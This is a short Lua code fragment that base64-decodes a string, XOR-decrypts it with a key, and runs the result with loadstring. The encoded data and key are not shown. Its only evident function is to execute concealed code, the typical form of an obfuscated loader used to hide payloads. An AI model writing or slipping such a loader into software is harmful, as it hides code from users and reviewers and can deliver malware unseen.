local A="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local L={}for i=1,#A do L[A:sub(i,i)]=i-1 end
local t={}local buf,bits=0,0
for i=1,#B do local v=L[B:sub(i,i)]if v then buf=buf*64+v bits=bits+6
if bits>=8 then bits=bits-8 local b=math.floor(buf/2^bits)t[#t+1]=string.char(b%256)buf=buf-b*2^bits end end end
local s=table.concat(t)
local o={}local kl=#K
for i=1,#s do o[i]=string.char(bit32.bxor(string.byte(s,i)%256,string.byte(K,(i-1)%kl+1)))end
local f=loadstring(table.concat(o))
if f then f()end